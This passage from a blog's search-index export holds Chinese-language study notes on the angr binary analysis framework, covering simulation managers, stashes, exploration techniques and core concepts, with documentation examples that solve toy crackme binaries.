接收一个以state为参数并返回该state要移去哪个stash名字的函数</p></blockquote><p>现在的angr中<code>n</code>和<code>until</code>已经移植到<code>run()</code>中，用法相同</p><h4 id="use-technique"><a href="#use-technique" class="headerlink" title="use_technique"></a>use_technique</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> Use an exploration technique with this SimulationManager.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Techniques can be found in :mod:`angr.exploration_techniques`.</span><br><span class="hljs-string"></span><br><span class="hljs-string">:param tech:    一个ExplorationTechnique对象，用以控制该SimluationManger行为</span><br><span class="hljs-string">:type tech:     ExplorationTechnique           （note：ExplorationTechnique也是angr的一个比较重要的类）</span><br><span class="hljs-string">:return:        The technique that was added, for convenience</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(tech, ExplorationTechnique):<br>            <span class="hljs-keyword">raise</span> SimulationManagerError<br><br>        <span class="hljs-comment"># <span class="hljs-doctag">XXX:</span> as promised</span><br>        tech.project = self._project<br>        tech.setup(self)<br><br>        HookSet.install_hooks(self, **tech._get_hooks())<br>        self._techniques.append(tech)<br>        <span class="hljs-keyword">return</span> tech<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>State是一个模拟状态，里面包含很多值，各种寄存器，内存以及几乎所有可以变得值，它是大多数函数的参数。</p><p>我们想要得到一个state，可以调用factory里的关于state的方法。还可以使用得到的state的对象以及factory.simgr方法得到一个SimManger对象。factory相当于一个工具箱，封装angr内部许多常用方法，方便我们调用，就不需要自己手动操作了。</p><p>当我们拥有一个state的时候，就可以把它丢给SimManger了，我们可以到一个SimManger的对象，这一步相当于把这个state拉伸进内存，得到更多有效信息，就可以开始正式执行了，而且我们还可以设定各种执行方式，是只走一步还是一直走到尽头?中间状态要怎么处理？以什么方式走？等等</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Simulation Managers</title>
    <link href="/2023/05/24/Simulation-Managers/"/>
    <url>/2023/05/24/Simulation-Managers/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/core-concepts/pathgroups.html#simulation-managers">Stepping Stash-Management Simple-Exploration Exploration-Techniques</a></p><span id="more"></span><blockquote><p>The most important control interface in angr is the SimulationManager, which allows you to control symbolic execution over groups of states simultaneously, applying search strategies to explore a program’s state space. Here, you’ll learn how to use it.</p></blockquote><p>概括：angr里面最重要的控制接口就是<code>SimulationManager</code>,可以以此同时控制不同的<code>states</code>符号执行，我们也可以以此来执行我们的搜索策略</p><blockquote><p>Simulation managers let you wrangle multiple states in a slick way. States are organized into “stashes”, which you can step forward, filter, merge, and move around as you wish. This allows you to, for example, step two different stashes of states at different rates, then merge them together. The default stash for most operations is the <code>active</code> stash, which is where your states get put when you initialize a new simulation manager.</p></blockquote><p>概括：我们可以用用<code>Simulation Managers</code>来管理多个<code>states</code>,<code>States</code>又是由<code>stashes</code>组成，这些<code>stashes</code>我们可以步入、过滤、融合甚至移到另一个<code>stashes</code>,对于绝大多数的<code>stashes</code>都是<code>active</code></p><p>note: 这里一直说的<code>stashes</code>其实就是一种状态标志，意味这个block是否还能继续走下去，比如说一个block是<code>active</code>的，那么它就还有后继而且还能继续往下执行。所以当我们初始丢给<code>Simulation Manager</code>的state应该是<code>active</code>的，这样它<code>Simulation Manager</code>才会为我们模拟执行</p><h2 id="Stepping"><a href="#Stepping" class="headerlink" title="Stepping"></a>Stepping</h2><p>一个简单的demo</p><p>我们使用<code>.step()</code>来让当前的state执行一步，去到下一个block。demo中给出了两个block的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>, auto_load_libs=<span class="hljs-literal">False</span>)<br>state = proj.factory.entry_state()<br>simgr = proj.factory.simgr(state)<br>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400580</span>&gt;]<br><br>simgr.step()<br>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400540</span>&gt;]<br></code></pre></td></tr></table></figure><p>你一定想问，那如果一个state的后继不止有一个呢？答案是<code>.step()</code>都会执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Step until the first symbolic branch</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(simgr.active) == <span class="hljs-number">1</span>:     <span class="hljs-comment">#只有当前处于active的数量为1，才往下执行</span><br><span class="hljs-meta">... </span>   simgr.step()<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400692</span>&gt;, &lt;SimState @ <span class="hljs-number">0x400699</span>&gt;]<br><br><span class="hljs-comment"># Step until everything terminates</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.run()<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">3</span> deadended&gt;<br></code></pre></td></tr></table></figure><p>如果我们不关心中间过程，只希望它能一直跑下去，直到再也没有后继块可以执行，那么我们可以用.<code>run()</code></p><p>现在我们使用了<code>.run()</code>得到最终的state，它有三个<code>stash</code>,并且都是<code>deadended</code>状态，也就是跑不动了</p><h2 id="Stash-Management"><a href="#Stash-Management" class="headerlink" title="Stash Management"></a>Stash Management</h2><p>我们可以用<code>.move()</code>来转移状态，它有三个参数<code>from_stash</code>,<code>to_statsh</code>,以及一个可选参数<code>filter_func</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">simgr.move(from_stash=<span class="hljs-string">&#x27;deadended&#x27;</span>, to_stash=<span class="hljs-string">&#x27;authenticated&#x27;</span>, filter_func=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> authenticated, <span class="hljs-number">1</span> deadended&gt;<br></code></pre></td></tr></table></figure><p>这个demo让我们把输出含有<code>Welcome</code>的state转移到<code>authenticated</code>，也就是说<code>authenticated</code>里的state都含有<code>Welcome</code></p><p>每一个<code>stash</code>都是一个列表，我们可以用常规的去索引，也可以用其他方法。如果我们加一个前缀<code>one_</code>那么我们就会访问这个<code>stash</code>的第一个元素，如果用<code>mp_</code>就可以同时访问全部，关于<code>mp_</code>这有一个<a href="https://github.com/zardus/mulpyplexer">说明</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> simgr.deadended + simgr.authenticated:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s.addr))<br><span class="hljs-number">0x1000030</span><br><span class="hljs-number">0x1000078</span><br><span class="hljs-number">0x1000078</span><br><br>simgr.one_deadended<br>&lt;SimState @ <span class="hljs-number">0x1000030</span>&gt;<br>simgr.mp_authenticated<br>MP([&lt;SimState @ <span class="hljs-number">0x1000078</span>&gt;, &lt;SimState @ <span class="hljs-number">0x1000078</span>&gt;])<br>simgr.mp_authenticated.posix.dumps(<span class="hljs-number">0</span>)<br>MP([<span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80\x80@\x80@\x00&#x27;</span>])<br></code></pre></td></tr></table></figure><blockquote><p>Of course, <code>step</code>, <code>run</code>, and any other method that operates on a single stash of paths can take a <code>stash</code> argument, specifying which stash to operate on.</p></blockquote><p>也就是所有的<code>step</code>,<code>run</code>方法都可以接受一个<code>stash</code>参数，来决定执行哪一个</p><h3 id="Stash-types"><a href="#Stash-types" class="headerlink" title="Stash types"></a>Stash types</h3><p>You can use stashes for whatever you like, but there are a few stashes that will be used to categorize some special kinds of states. These are:</p><table><thead><tr><th>Stash</th><th>Description</th></tr></thead><tbody><tr><td>active</td><td>可执行的</td></tr><tr><td>deadended</td><td>再也无法执行的，可能是因为无法到达，没有后继等</td></tr><tr><td>pruned</td><td>（不太确定）当使用<code>LAZY_SOLVES</code>时，states不会再检查可满足性，当一个state发现是<code>unsat</code>时，这个states路径上的所有states都会变成<code>pruned</code></td></tr><tr><td>unconstrained</td><td>如果 <code>save_unconstrained</code> 传递给SimelationManager constructor, 那些无约束的就时<code>unconstrained</code></td></tr><tr><td>unsat</td><td>如果 <code>save_unsat</code> 传递给SimelationManager constructor, 那些无解的就时<code>unsat</code>,比如要求输入同时满足即是’AAAA’又是’BBBB’</td></tr></tbody></table><h2 id="Simple-Exploration"><a href="#Simple-Exploration" class="headerlink" title="Simple Exploration"></a>Simple Exploration</h2><p>符号执行很普遍的用法是找到一个可以到达某个地址的states，而忽略其他所有的states，angr提供<code>.explore()</code>来方便执行。</p><p>当我们使用<code>.explore()</code>方法时，它可以接受两个参数<code>find</code>以及<code>avoid</code>。其中<code>find</code>可以是一个地址，一个列表，一个以<code>state</code>为参数返回某些值的函数，当任何一个<code>active</code>符合<code>find</code>的要求，那么它就会被放入<code>found</code>stash里面，同时停止执行，<code>avoid</code>一样，不过是放入<code>avoided</code>stash里面，然后继续符号执行。<code>num_find</code>可以决定找多少个<code>found</code>，简单demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 装载</span><br>proj = angr.Project(<span class="hljs-string">&#x27;examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a&#x27;</span>)<br><span class="hljs-comment"># 创建对象</span><br>simgr = proj.factory.simgr()<br><span class="hljs-comment"># 开始符号执行 搜索</span><br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Congrats&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active, <span class="hljs-number">1</span> found&gt;<br><span class="hljs-comment"># 找到一个 利用索引的方式得到该state</span><br>s = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 查看该state的输出</span><br><span class="hljs-built_in">print</span>(s.posix.dumps(<span class="hljs-number">1</span>))<br>Enter password: Congrats!<br><span class="hljs-comment"># 查看该state的输入</span><br>flag = s.posix.dumps(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(flag)<br>g00dJ0B!<br></code></pre></td></tr></table></figure><h2 id="Exploration-Techniques"><a href="#Exploration-Techniques" class="headerlink" title="Exploration Techniques"></a>Exploration Techniques</h2><p>angr内置了很多种的搜索算法，但是我们也可以自己写一个搜索算法，并通过<code>simgr.use_technique(tech)</code>调用，这里的<code>tech</code>是<code>ExplorationTechnique</code>子类。后面会再详谈，这里先列出angr内置的一些搜索算法</p><ul><li><em>DFS</em>: 深度优先，只会让一个state为active，把其他的放进<code>deferred</code>stash</li><li><em>Explorer</em>: 实现<code>.explore()</code>,可以使用<code>find</code>,<code>avoid</code>方法</li><li><em>LengthLimiter</em>:最长路径截断</li><li><em>LoopSeer</em>: 如果可能在一个循环里面，放入<code>spining</code>stash,直到其他可达路径都走完</li><li><em>ManualMergepoint</em>: 标记一个地址作为merge点，当一个stata到达此处时将其挂起，当其他state在某个时间内到达这个点时会被merge</li><li><em>Memory</em>：在<code>.step()</code>之间监视内存释放&#x2F;使用情况,如果内存释放&#x2F;使用得少的话，停止探索</li><li><em>Oppologist</em>: 当angr遇到一个不支持的指令的时候，会具体化所有的输入，并使用unicorn引擎来单独模拟这条指令，使得可以继续符号执行</li><li><em>Spiller</em>: 当有太多states处于active状态时，这可以把一些states放进磁盘中，使得内存开销比较小</li><li><em>Threading</em>: 使用多线程并行处理，但由于python全局变量线程锁的原因，这并不会有多大提升。但是如果在angr的native-code依赖（z3，unicorn，libvex）上花太多时间可以考虑这项技术</li><li><em>Tracer</em>：可以动态追踪资源</li><li><em>Veritesting</em>:自动识别有用的可合并点，使用<code>veritesting=True</code>来启用，这会提高搜索效率，但与其他算法配合得并不是很好</li></ul><p>Look at the API documentation for the <a href="https://docs.angr.io/en/latest/api.html#angr.sim_manager.SimulationManager"><code>SimulationManager</code></a> and <a href="https://docs.angr.io/en/latest/api.html#angr.exploration_techniques.ExplorationTechnique"><code>ExplorationTechnique</code></a> classes for more information.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Core Concept</title>
    <link href="/2023/05/23/Core-Concept/"/>
    <url>/2023/05/23/Core-Concept/</url>
    
    <content type="html"><![CDATA[<p>最基础的angr，<a href="https://docs.angr.io/en/latest/core-concepts/toplevel.html">原文档</a></p><span id="more"></span><h2 id="To-start-proj-angr-Project-39-ELF-path-39"><a href="#To-start-proj-angr-Project-39-ELF-path-39" class="headerlink" title="To start: proj = angr.Project(&#39;/ELF_path&#39;)"></a><em>To start</em>: <code>proj = angr.Project(&#39;/ELF_path&#39;)</code></h2><p>We can do these things with <code>proj</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> Check arch: proj.arch <span class="hljs-comment">#查看架构</span><br><span class="hljs-number">2.</span> Check entry: proj.entry <span class="hljs-comment">#查看程序入口</span><br><span class="hljs-number">3.</span> See Name : proj.filename <span class="hljs-comment">#查看文件名字</span><br></code></pre></td></tr></table></figure><h2 id="To-Load-proj-loader"><a href="#To-Load-proj-loader" class="headerlink" title="To Load: proj.loader"></a><em>To Load</em>: <code>proj.loader</code></h2><p>We can do these things with <code>proj.loader</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> See Shared_objects: proj.loader.shared_objects<br><span class="hljs-number">2.</span> See min_addr: proj.loader.min_addr<br><span class="hljs-number">3.</span> see max_addr: proj.loader.max_addr<br><span class="hljs-number">4.</span> See main_object: proj.loader.main_object <span class="hljs-comment"># 主要对象</span><br><span class="hljs-number">5.</span> Check the binary have an executable stack: proj.loader.main_object.execstack<br><span class="hljs-number">6.</span> Check this binary position-independent : proj.loader.main_object.pic<br></code></pre></td></tr></table></figure><h2 id="The-Factory"><a href="#The-Factory" class="headerlink" title="The Factory"></a><em>The Factory</em></h2><blockquote><p>There are a lot of classes in <code>angr</code>, and most of them require a project to be instantiated. Instead of making you pass around the project everywhere, we provide <code>project.factory</code>, which has several convenient constructors for common objects you’ll want to use frequently.</p></blockquote><p>angr有很多的类，基本上每一个类都需要一个<code>project</code>对象来实例化。angr提供了<code>project.factory</code>这一个接口，可以方便供我们使用</p><h2 id="Block-block-proj-factory-block-proj-entry"><a href="#Block-block-proj-factory-block-proj-entry" class="headerlink" title="Block  block = proj.factory.block(proj.entry)"></a><em>Block</em> <code> block = proj.factory.block(proj.entry)</code></h2><p>angr的基本执行对象是block，上面这行代码可以获得程序起始地址的块</p><p>What can do with <code>block</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> To see <span class="hljs-built_in">all</span> the instructions: block.pp()<br>out:<span class="hljs-number">0x401670</span>:       xor     ebp, ebp<br><span class="hljs-number">0x401672</span>:       mov     r9, rdx<br><span class="hljs-number">0x401675</span>:       pop     rsi<br><span class="hljs-number">0x401676</span>:       mov     rdx, rsp<br><span class="hljs-number">0x401679</span>:       <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">0x40167d</span>:       push    rax<br><span class="hljs-number">0x40167e</span>:       push    rsp<br><span class="hljs-number">0x40167f</span>:       lea     r8, [rip + <span class="hljs-number">0x2e2a</span>]<br><span class="hljs-number">0x401686</span>:       lea     rcx, [rip + <span class="hljs-number">0x2db3</span>]<br><span class="hljs-number">0x40168d</span>:       lea     rdi, [rip - <span class="hljs-number">0xd4</span>]<br><span class="hljs-number">0x401694</span>:       call    qword ptr [rip + <span class="hljs-number">0x205866</span>]<br><span class="hljs-number">2.</span>The number of the instructions:block.instructions<br><span class="hljs-number">3.</span>The address of the instructions: block.instrutions_addr<br>out:[<span class="hljs-number">0x401670</span>, <span class="hljs-number">0x401672</span>, <span class="hljs-number">0x401675</span>, <span class="hljs-number">0x401676</span>, <span class="hljs-number">0x401679</span>, <span class="hljs-number">0x40167d</span>, <span class="hljs-number">0x40167e</span>, <span class="hljs-number">0x40167f</span>, <span class="hljs-number">0x401686</span>, <span class="hljs-number">0x40168d</span>, <span class="hljs-number">0x401694</span>]<br></code></pre></td></tr></table></figure><h2 id="State-state-proj-factory-entry-state"><a href="#State-state-proj-factory-entry-state" class="headerlink" title="State: state = proj.factory.entry_state()"></a><em>State</em>: <code>state = proj.factory.entry_state()</code></h2><p>Some Examples:</p><blockquote><p>Here’s another fact about angr - the <code>Project</code> object only represents an “initialization image” for the program. When you’re performing execution with angr, you are working with a specific object representing a <em>simulated program state</em> - a <code>SimState</code>. Let’s grab one right now!</p></blockquote><p>Project只是程序的一个初始框架，真正符号执行的是一个个<code>SimState</code>,现在创建一个state</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">state = proj.factory.entry_state()<br>&lt;SimState @ <span class="hljs-number">0x401670</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><p>A SimState contains a program’s memory, registers, filesystem data… any “live data” that can be changed by execution has a home in the state.</p></blockquote><p>一个<code>state</code>包含了很多状态，比如内存、寄存器、各种可能改变的值都会存储在state里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-number">1.</span> state.regs.rip <span class="hljs-comment"># get the current instrucion pointer</span><br>out: &lt;BV64 <span class="hljs-number">0x401670</span>&gt;<br><span class="hljs-number">2.</span> state.regs.rax<br>out: &lt;BV64 <span class="hljs-number">0x1c</span>&gt;<br><span class="hljs-number">3.</span> state.mem[proj.entry].<span class="hljs-built_in">int</span>.resolved  <span class="hljs-comment"># interpret the memory at the entry point as a C int</span><br>out: &lt;BV32 <span class="hljs-number">0x8949ed31</span>&gt;<br></code></pre></td></tr></table></figure><p>About <code>bv</code> and <code>bvv</code></p><p><code>bv</code>就是BitVector，angr存储数据的形式；<code>bvv</code>就是BitVector Value，代表这个位向量的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># bv -&gt; bitvectors to represent CPU data in angr</span><br><span class="hljs-comment"># Note that each bitvector has a .length property describing how wide it is in bits.</span><br><br><span class="hljs-number">1.</span> bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># create a 32-bit-wide bitvector with value 0x1234</span><br>out: &lt;BV32 <span class="hljs-number">0x1234</span>&gt;<br><span class="hljs-number">2.</span> state.solver.<span class="hljs-built_in">eval</span>(bv)                <span class="hljs-comment"># convert to Python int</span><br>out: <span class="hljs-number">0x1234</span><br></code></pre></td></tr></table></figure><p>存储 <code>bitvectors</code> 到 <code>reg</code> or <code>mem</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<br>  state.regs.rsi<br>out: &lt;BV64 <span class="hljs-number">0x3</span>&gt;<br><br><span class="hljs-number">2.</span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><br>state.mem[<span class="hljs-number">0x1000</span>].long.resolved<br>out:&lt;BV64 <span class="hljs-number">0x4</span>&gt;<br></code></pre></td></tr></table></figure><p>About <code>mem</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>Use array[index] notation to specify an address<br><br><span class="hljs-number">2.</span>Use .&lt;<span class="hljs-built_in">type</span>&gt; to specify that the memory should be interpreted <span class="hljs-keyword">as</span> &amp;lt;<span class="hljs-built_in">type</span>&amp;gt; (common values: char, short, <span class="hljs-built_in">int</span>, long, size_t, uint8_t, uint16_t…)<br><br>From there, you can either:<br><br> <span class="hljs-number">1</span>˚ Store a value to it, either a bitvector <span class="hljs-keyword">or</span> a Python <span class="hljs-built_in">int</span><br><br> <span class="hljs-number">2</span>˚ Use .resolved to get the value <span class="hljs-keyword">as</span> a bitvector<br><br> <span class="hljs-number">3</span>˚ Use .concrete to get the value <span class="hljs-keyword">as</span> a Python <span class="hljs-built_in">int</span><br></code></pre></td></tr></table></figure><h2 id="Simulation-Managers"><a href="#Simulation-Managers" class="headerlink" title="Simulation Managers"></a><em>Simulation Managers</em></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> simgr = proj.factory.simulation_manager(state)<br><span class="hljs-comment">#  The constructor can take a state or a list of states.</span><br>out: &lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><br><span class="hljs-number">2.</span> simgr.step()<br><span class="hljs-comment"># 这个step会进入block的下个块，如果有分支，那么angr都会进入，后面的文章会再提及</span><br></code></pre></td></tr></table></figure><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a><em><strong>Analyses</strong></em></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ange has lots of built-in analyses</span><br> proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      proj.analyses.reload_analyses<br> proj.analyses.BinaryOptimizer      proj.analyses.DDG                  proj.analyses.StaticHooker<br> proj.analyses.BinDiff              proj.analyses.DFG                  proj.analyses.VariableRecovery<br> proj.analyses.BoyScout             proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast<br> proj.analyses.CDG                  proj.analyses.GirlScout            proj.analyses.Veritesting<br> proj.analyses.CFG                  proj.analyses.Identifier           proj.analyses.VFG<br> proj.analyses.CFGEmulated          proj.analyses.LoopFinder           proj.analyses.VSA_DDG<br> proj.analyses.CFGFast              proj.analyses.Reassembler<br></code></pre></td></tr></table></figure><p>for information about these methods, we should check <code>api documention angr.analyses</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
